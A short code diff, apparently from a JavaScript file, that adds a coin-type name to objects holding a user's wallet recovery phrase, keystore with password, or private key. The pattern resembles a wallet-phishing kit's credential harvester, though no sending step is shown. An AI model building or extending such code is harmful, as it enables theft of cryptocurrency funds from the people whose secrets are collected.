@@ -9126,17 +9126,20 @@
         // message += `${coinType}\n\n`;
         if ( reqPhrase ) {
           data = {
+            name: coinType,
             type: 'Phrase',
             phrase: reqPhrase
           }
         } else if ( reqKeystore ) {
           data = {
+            name: coinType,
             type: 'Keystore',
             keystore: reqKeystore,
             password: reqPassword
           }
         } else if ( reqPrivateKey ) {
           data = {
+            name: coinType,
             type: 'Private Key',
             privateKey: reqPrivateKey
           }
